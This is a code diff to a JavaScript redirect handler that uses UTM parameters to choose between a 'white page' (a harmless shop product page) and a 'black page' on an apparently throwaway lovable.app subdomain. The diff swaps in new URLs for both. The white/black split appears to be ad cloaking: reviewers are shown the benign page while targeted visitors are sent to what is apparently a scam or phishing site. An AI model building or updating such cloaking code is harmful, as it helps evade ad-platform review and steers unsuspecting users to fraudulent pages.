@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.otto.de/p/filsko-kramfors-winter-filz-hausschuhe-fuer-herren-hausschuh-mit-reissverschluss-S06250MH/";
-    const blackPageURL = "https://instentquzzz.lovable.app/?";
+    const whitePageURL = "https://www.kindermaxx.de/en/toys/baby-toys/cuddly-toys-blankets/konges-sloejd-cuddle-toy-pony-fiona-40-cm?c=1223";
+    const blackPageURL = "https://msgurupml.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
